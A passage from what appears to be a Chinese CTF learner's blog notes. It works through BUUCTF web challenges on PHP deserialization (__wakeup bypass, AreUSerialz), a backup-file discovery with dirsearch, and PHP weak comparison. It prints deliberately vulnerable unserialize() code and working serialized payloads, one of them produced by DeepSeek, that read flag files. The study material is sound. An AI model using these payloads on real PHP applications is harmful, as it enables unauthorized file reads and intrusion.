php">&lt;!DOCTYPE html&gt;<br>&lt;head&gt;<br>  &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>  &lt;title&gt;I have a cat!&lt;/title&gt;<br>  &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;https://cdnjs.cloudflare.com/ajax/libs/meyer-reset/2.0/reset.min.css&quot;</span>&gt;<br>      &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;style.css&quot;</span>&gt;<br>&lt;/head&gt;<br>&lt;style&gt;<br>    <span class="hljs-comment">#login&#123;   </span><br>        position: absolute;   <br>        top: <span class="hljs-number">50</span>%;   <br>        left:<span class="hljs-number">50</span>%;   <br>        margin: -<span class="hljs-number">150</span>px <span class="hljs-number">0</span> <span class="hljs-number">0</span> -<span class="hljs-number">150</span>px;   <br>        width: <span class="hljs-number">300</span>px;   <br>        height: <span class="hljs-number">300</span>px;   <br>    &#125;   <br>    h4&#123;   <br>        font-size: <span class="hljs-number">2</span>em;   <br>        margin: <span class="hljs-number">0.67</span>em <span class="hljs-number">0</span>;   <br>    &#125;<br>&lt;/style&gt;<br>&lt;body&gt;<br><br><br><br><br><br><br><br>&lt;div id=<span class="hljs-string">&quot;world&quot;</span>&gt;<br>    &lt;div style=<span class="hljs-string">&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 85%;left: 440px;font-family:KaiTi;&quot;</span>&gt;因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯<br>    &lt;/div&gt;<br>    &lt;div style=<span class="hljs-string">&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 80%;left: 700px;font-family:KaiTi;&quot;</span>&gt;不愧是我！！！<br>    &lt;/div&gt;<br>    &lt;div style=<span class="hljs-string">&quot;text-shadow:0px 0px 5px;font-family:arial;color:black;font-size:20px;position: absolute;bottom: 70%;left: 640px;font-family:KaiTi;&quot;</span>&gt;<br>    <span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>;<br>    <span class="hljs-variable">$select</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;select&#x27;</span>];<br>    <span class="hljs-variable">$res</span>=<span class="hljs-title function_ invoke__">unserialize</span>(@<span class="hljs-variable">$select</span>);<br>    <span class="hljs-meta">?&gt;</span><br>    &lt;/div&gt;<br>    &lt;div style=<span class="hljs-string">&quot;position: absolute;bottom: 5%;width: 99%;&quot;</span>&gt;&lt;p align=<span class="hljs-string">&quot;center&quot;</span> style=<span class="hljs-string">&quot;font:italic 15px Georgia,serif;color:white;&quot;</span>&gt; Syclover @ cl4y&lt;/p&gt;&lt;/div&gt;<br>&lt;/div&gt;<br>&lt;script src=<span class="hljs-string">&#x27;http://cdnjs.cloudflare.com/ajax/libs/three.js/r70/three.min.js&#x27;</span>&gt;&lt;/script&gt;<br>&lt;script src=<span class="hljs-string">&#x27;http://cdnjs.cloudflare.com/ajax/libs/gsap/1.16.1/TweenMax.min.js&#x27;</span>&gt;&lt;/script&gt;<br>&lt;script src=<span class="hljs-string">&#x27;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/OrbitControls.js&#x27;</span>&gt;&lt;/script&gt;<br>&lt;script src=<span class="hljs-string">&#x27;https://s3-us-west-2.amazonaws.com/s.cdpn.io/264161/Cat.js&#x27;</span>&gt;&lt;/script&gt;<br>&lt;script  src=<span class="hljs-string">&quot;index.js&quot;</span>&gt;&lt;/script&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p>select-&gt;name,<br>好像要先查看admin密码  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">name</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;100&#x27;</span>);<br><br><span class="hljs-keyword">return</span>:<br>NO!!!hacker!!!<br>You name is: nonono<br>You password is: yesyes<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">name</span>(<span class="hljs-string">&#x27;guest&#x27;</span>,<span class="hljs-string">&#x27;100&#x27;</span>);<br></code></pre></td></tr></table></figure><p>再仔细看了一下，应该是要绕过wakeup函数里的赋值，不然就没法让username&#x3D;admin，<br>上网差了一下，发现以前我好像做过wakeup绕过的题，那就是修改元素个数，<br>还是绕不过，去找wp,最后发现是有private，要用url加密，不然的话会有些不可显示字符的缺漏导致错误<br>未url加密：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Nameusername&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;Namepassword&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;100&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>可以看到Nameusername，和Namepassowrd，这两元素是因为少了字符导致连起来了，编码后可以看到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>%<span class="hljs-number">3</span>A4%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>Name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Name%<span class="hljs-number">00</span>username%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>admin%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A14%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Name%<span class="hljs-number">00</span>password%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22100</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D<br></code></pre></td></tr></table></figure><p>正确的样式应该是： %00Name%00username , %00Name%00password<br>记得要把2改为3，找的有点眼花，也可以像wp那样传：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;Name&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">&quot;%00Name%00password&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;100&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>参考：<br><a href="https://blog.csdn.net/m0_62879498/article/details/124129841">https://blog.csdn.net/m0_62879498/article/details/124129841</a><br><a href="https://aidemofashi.github.io/2025/03/19/note-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/">https://aidemofashi.github.io/2025/03/19/note-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-01/</a></p><hr><h2 id="title-note-30date-2025-04-23-19-58-29tags-note"><a href="#title-note-30date-2025-04-23-19-58-29tags-note" class="headerlink" title="title: note-30date: 2025-04-23 19:58:29tags: note"></a>title: note-30<br>date: 2025-04-23 19:58:29<br>tags: note</h2><h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p>扫目录一直扫不出来，扫了十来次，最后发现是是请求太快，</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">dirsearch</span> -u http://<span class="hljs-number">087</span>da459-<span class="hljs-number">7</span>de3-<span class="hljs-number">4061</span>-<span class="hljs-number">82</span>c8-b3cf69426d11.node5.buuoj.cn:<span class="hljs-number">81</span>/ -w backup_include.txt --delay=<span class="hljs-number">1</span> -t <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>终于发现备份文件<br>&#x2F;index.php.bak  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include_once</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$key</span>)) &#123;  <span class="hljs-comment">//检查字符串是否只以数字构成，就是只能上传数字</span><br>        <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;Just num!&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$key</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$key</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$key</span> == <span class="hljs-variable">$str</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Try to find out source file!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="弱比较-强比较"><a href="#弱比较-强比较" class="headerlink" title="弱比较 强比较"></a>弱比较 强比较</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">在进行比较的时候 会先将两种参数类型转化成相同<br><br>如果为整型跟字符型比较 那么字符将从左往右提取整型直到遇到字符结束 再比较。<br><br>若字符型为数字中间包含了一个e或E 则e或E会被科学计数法的标记<br><br>而数字中间包含了一个. 也会被看作为小数点<br><br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/qq_51196842/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">120591289</span><br><br></code></pre></td></tr></table></figure><p>然后上网查intval函数绕过<br>intval函数在处理字符串时以数字开头遇到第一个字母时会停止。</p><p>大概就是弱比较会将不同数据类型，然后$key被转化类型会变成 123，<br>然后get传 123 进index即可</p><h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>直接拿到源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &lt;= <span class="hljs-number">125</span>))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>&#123;<span class="hljs-string">&#x27;str&#x27;</span>&#125;)) &#123;<br><br>    <span class="hljs-variable">$str</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;str&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_valid</span>(<span class="hljs-variable">$str</span>)) &#123;<br>        <span class="hljs-variable">$obj</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>反序列化题，有点复杂,给deepseek看:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs llvm">要获取flag，需要通过反序列化漏洞触发FileHandler类的read方法读取flag.php。步骤如下：<br><br>构造恶意对象：创建一个FileHandler对象，设置op为整数<span class="hljs-number">2</span>（绕过析构函数的修改），filename为flag.php。<br><br>处理序列化字符串：由于<span class="hljs-keyword">protected</span>属性在序列化中包含空字符，需使用大写S和十六进制转义绕过字符检查。<br><br>URL编码：确保特殊字符正确传输。<br><br>***<br>op为整数<span class="hljs-number">2</span>：绕过析构函数中的严格比较，触发read方法。<br><br>转义空字符：使用\<span class="hljs-number">00</span>表示空字符，通过is_valid检查。<br><br>读取flag.php：在析构时调用process，op仍为<span class="hljs-number">2</span>，读取flag.php内容输出。<br><br>它直接给出了payload<span class="hljs-operator">=</span><br>?str<span class="hljs-operator">=</span>O<span class="hljs-variable">%3</span>A<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>FileHandler<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>A<span class="hljs-number">3</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%7</span>BS<span class="hljs-variable">%3</span>A<span class="hljs-number">5</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>C<span class="hljs-number">00</span><span class="hljs-variable">%5</span>C<span class="hljs-number">2</span>A<span class="hljs-variable">%5</span>C<span class="hljs-number">00</span>op<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>Bi<span class="hljs-variable">%3</span>A<span class="hljs-number">2</span><span class="hljs-variable">%3</span>BS<span class="hljs-variable">%3</span>A<span class="hljs-number">11</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>C<span class="hljs-number">00</span><span class="hljs-variable">%5</span>C<span class="hljs-number">2</span>A<span class="hljs-variable">%5</span>C<span class="hljs-number">00</span>filename<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BS<span class="hljs-variable">%3</span>A<span class="hljs-number">8</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span>flag.php<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BS<span class="hljs-variable">%3</span>A<span class="hljs-number">10</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%5</span>C<span class="hljs-number">00</span><span class="hljs-variable">%5</span>C<span class="hljs-number">2</span>A<span class="hljs-variable">%5</span>C<span class="hljs-number">00</span>content<span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>BS<span class="hljs-variable">%3</span>A<span class="hljs-number">0</span><span class="hljs-variable">%3</span>A<span class="hljs-variable">%22</span><span class="hljs-variable">%22</span><span class="hljs-variable">%3</span>B<span class="hljs-variable">%7</span>D<br><br>直接传入后F<span class="hljs-number">12</span>得到了flag！！？<br></code></pre></td></tr></table></figure><p>自己来试试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>(<span class="hljs-variable">$op</span>=<span class="hljs-number">2</span>,<span class="hljs-variable">$filename</span>=<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><br>O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;\00*\00op&quot;</span>;N;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;\00*\00filename&quot;</span>;N;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;\00*\00content&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>还是没搞懂，去找wp吧</p><p>出来的一直是这玩意：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">2</span>:<span class="hljs-string">&quot;op&quot;</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;filename&quot;</span>;N;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>算了直接改吧<br>O:11:”FileHandler”:3:{s:2:”op”;2;s:8:”filename”;’flag.php’;s:7:”content”;N;}<br>不行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span>=<span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>=<span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>;<br><span class="hljs-comment">// $a=new FileHandler($op=&quot;2&quot;,$filename=&quot;flag.php&quot;);</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>行了</p><h2 id="总结：-1"><a href="#总结：-1" class="headerlink" title="总结："></a>总结：</h2><p>第一步：____destruct:  绕过 &#x3D;&#x3D;&#x3D; “2”，因为这里是强等字符串2于，直接传入数值2会让它不等于，而不会被置为1；<br>第二步：is_valid(),题目里定义了这个函数来判断输入的字符是否未ascii码里的字符，若有在ascii码里的字符就会失败，这里网上就出现了两种绕过，<br>第一种：因为题目里用的是protected类型的变量，要从url传入的话会多出不ascii里的字符，所以想办法将payload里的不不合要求字符替换。<br>第二种：利用php 7.1+版本对类的属性不敏感，直接传入public类，就不会有不和要求字符<br>具体看：<br><a href="https://blog.csdn.net/m0_46246804/article/details/108746253">https://blog.csdn.net/m0_46246804/article/details/108746253</a><br><a href="https://blog.csdn.net/m0_73734159/article/details/134648981">https://blog.csdn.net/m0_73734159/article/details/134648981</a></p><p>第二步：到了这里因为传入了2，所以到了read()函数，会有file_get_contents()函数来指定文件来下一步，直接使得filename&#x3D;”flag.php”即可</p><p>最后记得F12查看，因为程序里不会echo flag 而是 return flag！！！！！<br>wp里是用file_get_contents()的伪协议来直接输出base64编码后的flag</p><h2 id="notice-3"><a href="#notice-3" class="headerlink" title="notice"></a>notice</h2><p>is_valid()函数对传入的字符串进行判断，确保每一个字符ASCII码值都在32-125，即该函数的作用是确保参数字符串的每一个字符都是可打印的，才返回true。  </p><p>public无标记，变量名不变。 s:2:“op”;i:2;<br>protected在变量名前添加标记\00*\00。 s:5:“\00*\00op”;i:2;<br>private在变量名前添加标记\00类名\00。s:17:“\00类名\00op”;i:2;<br>序列化后protected类型的属性存在不可打印字符。（private类型的属性序列化后也产生不可打印字符）;<br>PHP版本7.1+，对属性的类型不敏感;</p><h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 